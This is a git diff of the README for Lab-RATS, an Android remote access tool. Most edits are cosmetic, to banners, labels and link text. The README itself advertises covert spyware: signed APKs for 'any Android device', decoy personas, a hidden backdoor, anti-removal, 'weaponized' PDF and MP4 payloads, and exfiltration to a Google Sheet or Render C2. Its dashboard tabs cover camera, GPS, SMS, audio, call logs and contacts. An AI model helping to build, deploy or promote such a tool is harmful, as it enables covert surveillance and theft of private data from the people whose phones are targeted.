@@ -1,4 +1,7 @@
 <p align="center">
+<img src="https://img.shields.io/badge/The one's who MIND don't matter...-The one's who MATTER don't mind...-cyan?style=for-the-badge&logo=maserati&logoColor=black">
+  
+<p align="center">
 <img width="1384" height="500" alt="Screenshot 2026-11-11 at 7 21 26 AM" src="https://github.com/user-attachments/assets/cddb6358-11f9-4ed6-a644-3b29c38fe5c2" />
 
 <p align="center">
@@ -13,7 +16,7 @@
 </p>
 
 <p align="left">
-  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=42&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=LAB-RATS" alt="Typing Banner"
+  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=38&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=LAB-RATS" alt="Typing Banner"
  />
 </p>
 
@@ -21,7 +24,7 @@
 
 **Developed from the ground up by K4N3CO, Lab-RATS is an open-source, lightweight Android Remote Administration framework** packed with powerful **monitoring** and **interaction capabilities**. The system **automates the generation of custom, signed `.apk` files** for **deployment onto any Android device**, providing **full device telemetry** via a **sleek, web-based C2 dashboard**. Built to adapt to **strict modern mobile environments**, it delivers a **robust feature suite** that **operates reliably** across both **legacy** and the **newest Android releases**.
 <details>
-  <summary>📸 Click to View Comparative Breakdown</summary>
+  <summary><b>📸 View Comparative Breakdown</summary></b>
   <br>
   <img src="https://github.com/user-attachments/assets/a2beda0b-122b-4e76-9daa-4d543e94dac3" alt="Full Web Page Screenshot" width="70%">
 </details>
@@ -29,14 +32,14 @@
 ---
 
 <p align="left">
-  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=32&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Direct+IPv6+Access" 
+  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=28&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Direct+IPv6+Access" 
 alt="Typing Banner"
  />
 </p>
 
 **Lab-RATS leverages the unique characteristics of publicly routable IPv6 addresses assigned by modern Wi-Fi and cellular *(5G/LTE)* carriers**. By **binding the control server directly to a device's Global Unicast Address** *(GUA)*, the tool **completely bypasses Carrier-Grade NAT** *(CGNAT)* and **inbound firewall restrictions**. This architecture **enables seamless, Zero-Configuration peer-to-peer** *(P2P)* **remote access from any modern web browser worldwide**—completely **eliminating the need for router manipulation, port forwarding**, or **third-party tunneling services** like **Ngrok** or **Pinggy**.
 <details>
-  <summary><b>📸 Click to View IPv6 Exploit Vector</summary></b>
+  <summary><b>📸 View IPv6 Exploit Vector</summary></b>
   <br><p align="center">
   <img src="https://github.com/user-attachments/assets/7097e0e0-1190-4774-b758-ca58b5e8760f" alt="Full Web Page Screenshot" width="80%">
 </details>
@@ -47,14 +50,15 @@ alt="Typing Banner"
 ---
 
 <p align="left">
-  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=32&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Core+Features+and+Security" alt="Typing Banner"/>
+  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=28&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Core+Features+and+Security" alt="Typing Banner"/>
 </p>
+
+  > [!IMPORTANT]
+  > DEFAULT PASSWORD = admin1337
 
 <details>
   <summary><b>🔐 Remote C2 Security & Secure Handshake</b></summary>
   <br>
-  > [!IMPORTANT]
-  > **DEFAULT PASSWORD = admin1337**
   <ul>
     <li><strong>C2 Security:</strong><br>
   - The <strong>C2 Dashboard</strong> is <strong>protected with a secure login</strong> which can be <strong>changed directly from the Terminal/Home page</strong>. The <strong>Default Password should be reset immediately</strong> for <strong>enhanced security</strong>.</li>
@@ -88,7 +92,7 @@ alt="Typing Banner"
 ---
 
 <p align="left">
-  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=32&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Covert+Operations+and+Stealth+Management" alt="Typing Banner"/>
+  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=28&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Covert+Operations+and+Stealth+Management" alt="Typing Banner"/>
 </p>
 
 <details>
@@ -175,7 +179,7 @@ alt="Typing Banner"
 ---
 
 <p align="left">
-  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=32&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Remote+Capabilities" alt="Typing Banner"/>
+  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=28&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Remote+Capabilities" alt="Typing Banner"/>
 </p>
 
 <details>
@@ -293,7 +297,7 @@ alt="Typing Banner"
 ---
 
 <p align="left">
-  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=32&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Native+Integration" alt="Typing Banner"/>
+  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=28&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Native+Integration" alt="Typing Banner"/>
 </p>
 
 <details>
@@ -322,14 +326,14 @@ alt="Typing Banner"
 ---
 
 <p align="left">
-  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=32&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Command+and+Control+(C2)+Options" alt="Typing Banner"/>
+  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=28&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Command+and+Control+(C2)+Options" alt="Typing Banner"/>
 </p>
 
 **Lab-RATS** supports **TWO primary methods** to **Receive Data, Connect Remotely & Track your Devices**.
 ### ☝🏻 Option 1: Google Sheet *(Updated)*
-**Best for basic IP tracking** and **logging**. **No server maintenance required**.
+**Best for Basic IP tracking** & **logging**. **NO server maintenance required!**.
 
-1. **Create a new** <a href="https://docs.google.com/spreadsheets/u/0/" target="_blank">Google Sheet</a>.
+1. **Create a New** <a href="https://docs.google.com/spreadsheets/u/0/" target="_blank">Google Sheet</a>.
 2. Go to **Extensions** → **Apps Script** and **Paste in the Hybrid Snippet below:**
 
 ```javascript
@@ -387,13 +391,13 @@ data.stealth === "true") ? "ACTIVE" : "OFF",
 > 4. **Copy the Google Webhook URL provided** *(e.g., `https://script.google.com/macros/s/AKfycbwXQSVQ0dYdi...`)* and **prepare to paste it into the APK-builder Tool when prompted** for the **C2 Webhook URL** *(Get Started Section Below)*.
 
 <details>
-  <summary><b>📸 Click to View Google Sheet Reporting Example</summary></b>
+  <summary><b>📸 View Google Sheet Reporting Example</summary></b>
   <img src="https://github.com/user-attachments/assets/ad174175-eed8-46b4-bd8d-8c72895cf88a" alt="Full Web Page Screenshot" width="80%">
 </details>
 
 ---
 
-### ✌🏻 Option 2: Tactical Node.js Backend
+### ✌🏻 Option 2: Render Web Service (Tactical Node.js Backend)
 **Best for newer devices running Android 16/17, Professional Fleet Management** & **Automatic File Exfiltration**.
 
 **1. Fork the Lab-RATS-v1.6 repository**.
@@ -404,21 +408,9 @@ data.stealth === "true") ? "ACTIVE" : "OFF",
 
 > [!IMPORTANT]
 > **Once live, Copy your Render URL** *(e.g., `https://labrats-github.onrender.com`)*, and **prepare to enter it into the APK-Builder Tool when prompted** for the **C2 Webhook URL** *(Get Started Section Below)*.
-<details>
-  <summary><b>📸 Click to View Render Setup</summary></b>
-  <br>
-  <img src="https://github.com/user-attachments/assets/7cc93099-7528-40b1-b261-de7f72dfc54a" alt="Full Web Page Screenshot" width="50%">
-  <img src="https://github.com/user-attachments/assets/bc6d4e57-3053-4d21-b46e-f3241cdb959a" alt="Full Web Page Screenshot" width="50%">
-  </details>
 
 <details>
-  <summary><b>📸 Click to View Render C2 Screenshot</summary></b>
-  <br>
-  <img src="https://github.com/user-attachments/assets/308a906f-c331-406b-8718-23b2d113a04a" alt="Full Web Page Screenshot" width="80%">
-</details>
-
-<details>
-  <summary><b>🌐 Advantages of Option 2 (Tactical Node.js Backend)</b></summary>
+  <summary><b>🌐 Advantages of Option 2</b></summary>
   <br>
   <ul>
     <li><strong>Dual-Stack IP Binding:</strong><br>
@@ -432,10 +424,23 @@ data.stealth === "true") ? "ACTIVE" : "OFF",
   </ul>
 </details>
 
+<details>
+  <summary><b>📸 View Render Setup</summary></b>
+  <br>
+  <img src="https://github.com/user-attachments/assets/7cc93099-7528-40b1-b261-de7f72dfc54a" alt="Full Web Page Screenshot" width="50%">
+  <img src="https://github.com/user-attachments/assets/bc6d4e57-3053-4d21-b46e-f3241cdb959a" alt="Full Web Page Screenshot" width="50%">
+  </details>
+
+<details>
+  <summary><b>📸 View Render C2 Screenshot</summary></b>
+  <br>
+  <img src="https://github.com/user-attachments/assets/308a906f-c331-406b-8718-23b2d113a04a" alt="Full Web Page Screenshot" width="80%">
+</details>
+
 ---
 
 <p align="left">
-  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=32&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=System+Requirements+and+Prerequisites" alt="Typing Banner"/>
+  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=28&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=System+Requirements+and+Prerequisites" alt="Typing Banner"/>
 </p>
 
 To **Build, Compile**, and **Deploy Lab-RATS** or **Host the C2 server**, ensure **your Environment meets the following requirements**:
@@ -497,7 +502,7 @@ To **Build, Compile**, and **Deploy Lab-RATS** or **Host the C2 server**, ensure
 ---
 
 <p align="left">
-  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=32&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Get+Started" alt="Typing Banner"
+  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=28&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Get+Started" alt="Typing Banner"
  />
 </p>
 
@@ -515,7 +520,7 @@ To **Build, Compile**, and **Deploy Lab-RATS** or **Host the C2 server**, ensure
 6.  **Retrieve your** `signed.apk` *(and any weaponized payloads like PDFs or MP4s)* from `Lab-RATS/apk-builder/output/`
 
 <details>
-  <summary><b>📸 Click to View APK-Builder Menu</summary></b>
+  <summary><b>📸 View APK-Builder Menu</summary></b>
   <img src="https://github.com/user-attachments/assets/8cb583e6-6c59-46cf-8f94-668f0a34b74e" alt="Full Web Page Screenshot" width="60%">
 </details>
 
@@ -570,37 +575,37 @@ To **Build, Compile**, and **Deploy Lab-RATS** or **Host the C2 server**, ensure
 ---
 
 <p align="left">
-  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=32&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Documentation+Index" alt="Typing Banner"/>
+  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=28&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Documentation+Index" alt="Typing Banner"/>
 </p>
 
 | File                                                               | Subject & Contents                                                  |
 |:-------------------------------------------------------------------|:--------------------------------------------------------------------|
 | **[00-Quickstart.md](00-Quickstart.md)**                           | 3-step quickstart guide from clone to live dashboard connection.    |
 | **[01-Requirements.md](01-Requirements.md)**                       | Workstation build host, JDK, Android SDK, and device compatibility. |
-| **[02-Building_Payloads.md](02-Building_Payloads.md)**             | Builder menu options, configuration keys, and decoy personas.       |
-| **[03-C2_Deployment.md](03-C2_Deployment.md)**                     | C2 deployment options: Render C2 relay, Direct IP, Google Sheets.   |
-| **[04-Device_HTTP-API.md](04-Device_HTTP-API.md)**                 | Device HTTP API reference for control endpoints.                    |
-| **[05-Dashboard_Reference.md](05-Dashboard_Reference.md)**         | Overview of the 13 C2 dashboard tabs and features.                  |
-| **[06-Stealth_and_Persistence.md](06-Stealth_and_Persistence.md)** | Decoy personas, 10-tap backdoor, watchdog layers, and anti-removal. |
+| **[02-Building Payloads.md](02-Building_Payloads.md)**             | Builder menu options, configuration keys, and decoy personas.       |
+| **[03-C2 Deployment.md](03-C2_Deployment.md)**                     | C2 deployment options: Render C2 relay, Direct IP, Google Sheets.   |
+| **[04-Device HTTP-API.md](04-Device_HTTP-API.md)**                 | Device HTTP API reference for control endpoints.                    |
+| **[05-Dashboard Reference.md](05-Dashboard_Reference.md)**         | Overview of the 13 C2 dashboard tabs and features.                  |
+| **[06-Stealth and Persistence.md](06-Stealth_and_Persistence.md)** | Decoy personas, 10-tap backdoor, watchdog layers, and anti-removal. |
 | **[07-Troubleshooting.md](07-Troubleshooting.md)**                 | Solutions for common build, installation, and connection issues.    |
 | **[08-Architecture.md](08-Architecture.md)**                       | High-level system architecture diagram and component map.           |
-| **[09-Security_Notes.md](09-Security_Notes.md)**                   | Security considerations, authentication, and forensic reduction.    |
+| **[09-Security Notes.md](09-Security_Notes.md)**                   | Security considerations, authentication, and forensic reduction.    |
 | **[10-FAQ.md](10-FAQ.md)**                                         | Frequently asked questions and answers.                             |
-| **[11-Maintaining_Your_Fork.md](11-Maintaining_Your_Fork.md)**     | Guidelines for rebranding and syncing upstream updates.             |
-| **[12-Server_Setup.md](12-Server_Setup.md)**                       | C2 server setup guide for Render.com and Linux VPS.                 |
-| **[13-Direct_IPv6_Hardening.md](13-Direct_IPv6_Hardening.md)**     | Direct IPv6 connection & pre-flight security hardening guide.       |
-| **[14-Free_IPv6_Hosting.md](14-Free_IPv6_Hosting.md)**             | Free hosting provider comparison.                                   |
+| **[11-Maintaining Your Fork.md](11-Maintaining_Your_Fork.md)**     | Guidelines for rebranding and syncing upstream updates.             |
+| **[12-Server Setup.md](12-Server_Setup.md)**                       | C2 server setup guide for Render.com and Linux VPS.                 |
+| **[13-Direct IPv6 Hardening.md](13-Direct_IPv6_Hardening.md)**     | Direct IPv6 connection & pre-flight security hardening guide.       |
+| **[14-Free IPv6 Hosting.md](14-Free_IPv6_Hosting.md)**             | Free hosting provider comparison.                                   |
 
 ---
 
 <p align="left">
-  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=32&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Support+the+Development" alt="Typing Banner"/>
+  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=28&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Support+the+Development" alt="Typing Banner"/>
 </p>
 
 **If** you find **Lab-RATS Awesome** and **Useful for your Testing & Security Research**, **Please Star ⭐ the project**—it **drives further development!**
 
 <p align="left">
-  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=22&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Contributions" alt="Typing Banner"/>
+  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=20&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Contributions" alt="Typing Banner"/>
 </p>
 
 **Bug Reports, Add New Feature** and **Pull Requests** are **Always Welcome!** *(See [CONTRIBUTING.md](https://github.com/K4N3CO/Lab-RATS/blob/main/CONTRIBUTING.md) for **more info**)*.
@@ -608,7 +613,7 @@ To **Build, Compile**, and **Deploy Lab-RATS** or **Host the C2 server**, ensure
 ---
 
 <p align="left">
-  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=22&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Donations" alt="Typing Banner"
+  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=20&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Donations" alt="Typing Banner"
  />
 </p>
 
@@ -617,7 +622,7 @@ To **Build, Compile**, and **Deploy Lab-RATS** or **Host the C2 server**, ensure
 ---
 
 <p align="left">
-  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=32&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Video+Clips" alt="Typing Banner"
+  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=28&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Video+Clips" alt="Typing Banner"
  />
 </p>
 
@@ -652,14 +657,14 @@ https://github.com/user-attachments/assets/cff1facc-8657-4707-a1dc-5208640e9c2a
 ---
 
 <p align="left">
-  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=32&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Screenshots" alt="Typing Banner"
+  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=28&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Screenshots" alt="Typing Banner"
  />
 </p>
 
 ### 00. Lab-RATS Server Installed on Android Device:
 
 <details>
-  <summary>📸 Click to View App Screenshot</summary>
+  <summary>📸 View App Screenshot</summary>
   <br>
   <img src="https://github.com/user-attachments/assets/928a2a7a-a6de-4b32-93ee-7811de3b06a2" alt="Full Web Page Screenshot" width="30%">
 </details>
@@ -669,7 +674,7 @@ https://github.com/user-attachments/assets/cff1facc-8657-4707-a1dc-5208640e9c2a
 ### 01. Home/Terminal Tab:
 
 <details>
-  <summary>📸 Click to View Dashboard Screenshot</summary>
+  <summary>📸 View Dashboard Screenshot</summary>
   <br>
   <img src="https://github.com/user-attachments/assets/7f4e02c5-4984-48e5-a76c-6c4ba530495c" alt="Full Web Page Screenshot" width="80%">
 </details>
@@ -679,7 +684,7 @@ https://github.com/user-attachments/assets/cff1facc-8657-4707-a1dc-5208640e9c2a
 ### 02. Ghost Operations Tab:
 
 <details>
-  <summary>📸 Click to View Dashboard Screenshot</summary>
+  <summary>📸 View Dashboard Screenshot</summary>
   <br>
   <img src="https://github.com/user-attachments/assets/3eb33ae7-aebd-4464-8547-979bb296eb27" alt="Full Web Page Screenshot" width="80%">
 </details>
@@ -689,7 +694,7 @@ https://github.com/user-attachments/assets/cff1facc-8657-4707-a1dc-5208640e9c2a
 ### 03. Optics/Live Camera Tab:
 
 <details>
-  <summary>📸 Click to View Dashboard Screenshot</summary>
+  <summary>📸 View Dashboard Screenshot</summary>
   <br>
   <img src="https://github.com/user-attachments/assets/bea953b9-753e-412d-b10e-12ded5055d82" alt="Full Web Page Screenshot" width="80%">
 </details>
@@ -699,7 +704,7 @@ https://github.com/user-attachments/assets/cff1facc-8657-4707-a1dc-5208640e9c2a
 ### 04. Locate/Live GPS Tab:
 
 <details>
-  <summary>📸 Click to View Dashboard Screenshot</summary>
+  <summary>📸 View Dashboard Screenshot</summary>
   <br>
   <img src="https://github.com/user-attachments/assets/3425ccc3-db7b-43ab-b3b9-8cb3c555469b" alt="Full Web Page Screenshot" width="80%">
 </details>
@@ -709,7 +714,7 @@ https://github.com/user-attachments/assets/cff1facc-8657-4707-a1dc-5208640e9c2a
 ### 05. Exploit Factory Tab:
 
 <details>
-  <summary>📸 Click to View Dashboard Screenshot</summary>
+  <summary>📸 View Dashboard Screenshot</summary>
   <br>
   <img src="https://github.com/user-attachments/assets/2aaa4c63-1ee8-4589-a78c-c2fc6e4deadf" alt="Full Web Page Screenshot" width="80%">
 </details>
@@ -719,7 +724,7 @@ https://github.com/user-attachments/assets/cff1facc-8657-4707-a1dc-5208640e9c2a
 ### 06. Device Data/Storage Tab:
 
 <details>
-  <summary>📸 Click to View Dashboard Screenshot</summary>
+  <summary>📸 View Dashboard Screenshot</summary>
   <br>
   <img src="https://github.com/user-attachments/assets/835edd2f-35b4-4b7d-b527-c36ffa18990f" alt="Full Web Page Screenshot" width="80%">
 </details>
@@ -729,7 +734,7 @@ https://github.com/user-attachments/assets/cff1facc-8657-4707-a1dc-5208640e9c2a
 ### 07. Intel/App Notifications Tab:
 
 <details>
-  <summary>📸 Click to View Dashboard Screenshot</summary>
+  <summary>📸 View Dashboard Screenshot</summary>
   <br>
   <img src="https://github.com/user-attachments/assets/5ff097a0-4460-4a54-a149-253b628f7f01" alt="Full Web Page Screenshot" width="80%">
 </details>
@@ -739,7 +744,7 @@ https://github.com/user-attachments/assets/cff1facc-8657-4707-a1dc-5208640e9c2a
 ### 08. SMS/Text Message Tab:
 
 <details>
-  <summary>📸 Click to View Dashboard Screenshot</summary>
+  <summary>📸 View Dashboard Screenshot</summary>
   <br>
   <img src="https://github.com/user-attachments/assets/54acccb7-b412-4a57-9c15-ca36ce58050d" alt="Full Web Page Screenshot" width="80%">
 </details>
@@ -749,7 +754,7 @@ https://github.com/user-attachments/assets/cff1facc-8657-4707-a1dc-5208640e9c2a
 ### 09. MMS/Multimedia Message Tab:
 
 <details>
-  <summary>📸 Click to View Dashboard Screenshot</summary>
+  <summary>📸 View Dashboard Screenshot</summary>
   <br>
   <img src="https://github.com/user-attachments/assets/5340b242-bec6-440f-80ae-b1850d6eb163" alt="Full Web Page Screenshot" width="80%">
 </details>
@@ -759,7 +764,7 @@ https://github.com/user-attachments/assets/cff1facc-8657-4707-a1dc-5208640e9c2a
 ### 10. Acoustics/Audio Tab:
 
 <details>
-  <summary>📸 Click to View Dashboard Screenshot</summary>
+  <summary>📸 View Dashboard Screenshot</summary>
   <br>
   <img src="https://github.com/user-attachments/assets/4ec71933-6264-4d75-90db-aebfdf40e636" alt="Full Web Page Screenshot" width="80%">
 </details>
@@ -769,7 +774,7 @@ https://github.com/user-attachments/assets/cff1facc-8657-4707-a1dc-5208640e9c2a
 ### 11. Comms/Call Logs Tab:
 
 <details>
-  <summary>📸 Click to View Dashboard Screenshot</summary>
+  <summary>📸 View Dashboard Screenshot</summary>
   <br>
   <img src="https://github.com/user-attachments/assets/ae00ca08-43e0-42c8-8bfa-fde16523d096" alt="Full Web Page Screenshot" width="80%">
 </details>
@@ -779,7 +784,7 @@ https://github.com/user-attachments/assets/cff1facc-8657-4707-a1dc-5208640e9c2a
 ### 12. Contacts Tab:
 
 <details>
-  <summary>📸 Click to View Dashboard Screenshot</summary>
+  <summary>📸 View Dashboard Screenshot</summary>
   <br>
   <img src="https://github.com/user-attachments/assets/1da37dba-a84a-4e0f-8453-d763e73bade0" alt="Full Web Page Screenshot" width="80%">
 </details>
@@ -789,7 +794,7 @@ https://github.com/user-attachments/assets/cff1facc-8657-4707-a1dc-5208640e9c2a
 ### 13. Hardware/Device Info Tab:
 
 <details>
-  <summary>📸 Click to View Dashboard Screenshot</summary>
+  <summary>📸 View Dashboard Screenshot</summary>
   <br>
   <img src="https://github.com/user-attachments/assets/f1874c3d-0866-4c1f-9f94-f5ca2c1aed6e" alt="Full Web Page Screenshot" width="80%">
 </details>
@@ -797,7 +802,7 @@ https://github.com/user-attachments/assets/cff1facc-8657-4707-a1dc-5208640e9c2a
 ---
 
 <p align="left">
-  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=32&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Disclaimer" alt="Typing Banner"
+  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=28&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Disclaimer" alt="Typing Banner"
  />
 </p>
 
@@ -806,11 +811,11 @@ https://github.com/user-attachments/assets/cff1facc-8657-4707-a1dc-5208640e9c2a
 ---
 
 <p align="left">
-  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=32&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=License" alt="Typing Banner"
+  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=28&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=License" alt="Typing Banner"
  />
 </p>
 
-**Lab-RATS-v1.6** is **Licensed** to **K4N3CO** under the [MIT License](LICENSE).
+**Lab-RATS** is **Licensed** to **K4N3CO** under the [MIT License](LICENSE).
 
 ---
 
@@ -822,4 +827,4 @@ https://github.com/user-attachments/assets/cff1facc-8657-4707-a1dc-5208640e9c2a
 <img src="https://img.shields.io/badge/The one's who MIND don't matter...-The one's who MATTER don't mind...-cyan?style=for-the-badge&logo=maserati&logoColor=black">
 <br>
 <p align="center">
-<img src="https://img.shields.io/badge/©2026-K4N3CO.LABS-darkgreen?style=for-the-badge&logo=magisk&logoColor=white">
+<img src="https://img.shields.io/badge/©2026-K4N3CO-darkred?style=for-the-badge&logo=magisk&logoColor=white">
